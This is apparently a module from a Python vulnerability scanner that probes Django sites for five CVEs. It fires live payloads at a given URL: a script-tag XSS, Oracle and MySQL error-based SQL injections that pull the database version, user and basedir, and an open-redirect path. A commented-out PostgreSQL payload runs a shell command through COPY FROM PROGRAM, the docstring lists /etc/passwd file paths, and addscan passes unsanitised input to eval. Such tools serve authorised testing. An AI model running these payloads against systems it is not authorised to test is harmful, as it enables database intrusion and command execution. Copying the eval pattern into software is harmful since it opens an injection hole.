#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Django扫描类: 
        1. Django debug page XSS漏洞
            CVE-2017-12794
                Payload: https://vulhub.org/#/environments/django/CVE-2018-14574/

        2. Django JSONfield sql注入漏洞
            CVE-2019-14234
                Payload: https://vulhub.org/#/environments/django/CVE-2018-14574/
                         https://blog.csdn.net/weixin_42250835/article/details/121106792

        3. Django CommonMiddleware url重定向漏洞
            CVE-2018-14574
                Payload: https://vulhub.org/#/environments/django/CVE-2018-14574/

        4. Django GIS函数 sql注入漏洞
            CVE-2020-9402
                Payload: https://vulhub.org/#/environments/django/CVE-2020-9402/
        
        5. Django QuerySet.order_by sql注入漏洞
            CVE-2021-35042
                Payload: https://vulhub.org/#/environments/django/CVE-2021-35042/
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from flask import redirect
from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class Django():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Django'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2017_12794_payloads = [
            {
                'path': 'create_user/?username=<ScRiPt>prompt(\'12794\')</sCrIpt>',
                'data': ''
            }
        ]

        self.cve_2019_14234_payloads = [
            {
                'path': 'admin/vuln/collection/?detail__a\'b=123',
                'data': ''
            },
            {
                'path': 'vuln/collection/?detail__a\'b=123',
                'data': ''
            },
            {
                'path': 'collection/?detail__a\'b=123',
                'data': ''
            },
            {
                'path': '?detail__a\'b=123',
                'data': ''
            },
            # {   # * 配合CVE-2019-9193完成Getshell
            #     'path': "?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'touch /tmp/test.txt'--%20",
            #     'data': ''
            # }
        ]

        self.cve_2018_14574_payloads = [
            {
                'path': '/www.example.com',
                'data': ''
            }
        ]

        self.cve_2020_9402_payloads = [
            {
                'path': '?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1',
                'data': ''
            },
            {
                'path': '?q=0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --',
                'data': ''
            }
        ]

        self.cve_2021_35042_payloads = [
            {
                'path': '?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@basedir)),1)%23',
                'data': ''
            }
        ]

    def cve_2017_12794_scan(self, url):
        '''Django debug page XSS漏洞
                构造url创建新用户, 同时拼接xss语句, 得到已创建的提示;
                此时再次访问该链接(即创建同一个xss用户), 将触发恶意代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'XSS'
        vul_info['vul_id'] = 'CVE-2017-12794'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2017_12794_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res1 = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res1.status_code, res1)                        # * LOG

                # * 该XSS漏洞较奇怪, 需要请求2次, 2次的payload必须一模一样
                res2 = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res2.status_code, res2)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ("<ScRiPt>prompt('12794')" in check.check_res(res2.text, "prompt('12794')")):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2019_14234_scan(self, url):
        ''' Django JSONfield sql注入漏洞
                需要登录, 并进入当前用户的目录下
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SQLinject'
        vul_info['vul_id'] = 'CVE-2019-14234'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2019_14234_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('ProgrammingError' in res.text) or ('Request information' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2018_14574_scan(self, url):
        ''' 如果 django.middleware.common.CommonMiddleware和 APPEND_SLASH设置都已启用; 
            如果项目的 URL 模式接受任何以斜杠结尾的路径, 则对该站点的恶意制作的 URL 的请求可能会导致重定向到另一个站点; 
            从而启用网络钓鱼和其他攻击
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'Redirect'
        vul_info['vul_id'] = 'CVE-2018-14574'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2018_14574_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('Location' in str(res.headers)) and ('//www.example.com/' in str(res.headers))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2020_9402_scan(self, url):
        ''' 该漏洞需要开发者使用JSONField/HStoreField, 可以控制查询集的字段名称; 
            Django的内置应用程序 Django-Admin 受到影响  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SQLinject'
        vul_info['vul_id'] = 'CVE-2020-9402'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2020_9402_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('DatabaseError' in res.text) and ('Request information' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2021_35042_scan(self, url):
        ''' 函数 QuerySet.order_by 中的 SQL 注入漏洞; 
            该漏洞需要开发者使用order_by函数, 而且可以控制查询集的输入
         '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SQLinject'
        vul_info['vul_id'] = 'CVE-2021-35042'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2021_35042_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ((('OperationalError' in res.text) or ('DatabaseError' in res.text)) 
                and ('Request information' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_12794_scan, url=url),
            thread(target=self.cve_2019_14234_scan, url=url),
            thread(target=self.cve_2018_14574_scan, url=url),
            thread(target=self.cve_2020_9402_scan, url=url),
            thread(target=self.cve_2021_35042_scan, url=url)
        ]

django = Django()